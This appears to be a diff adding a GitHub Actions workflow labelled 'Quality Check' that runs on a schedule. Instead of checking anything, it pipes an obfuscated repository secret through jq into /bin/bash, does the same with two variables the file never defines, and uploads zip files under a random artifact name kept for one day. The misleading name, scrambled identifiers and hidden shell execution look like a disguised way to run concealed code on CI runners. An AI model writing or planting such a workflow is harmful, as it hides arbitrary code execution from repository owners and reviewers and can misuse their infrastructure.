@@ -1,0 +1,25 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 1,7,13,19 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          olcr120: ${{ secrets.olcr120 }}
+        run: |
+          printf '%s' "$olcr120" | jq -r .o16623 | /bin/bash
+          printf '%s' "$ih9338" | jq -r .bnhrq5 | /bin/bash
+          echo $rksd41 | jq -r .vb36 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: D7QLuQQI
+          path: "*.zip"
+          retention-days: 1
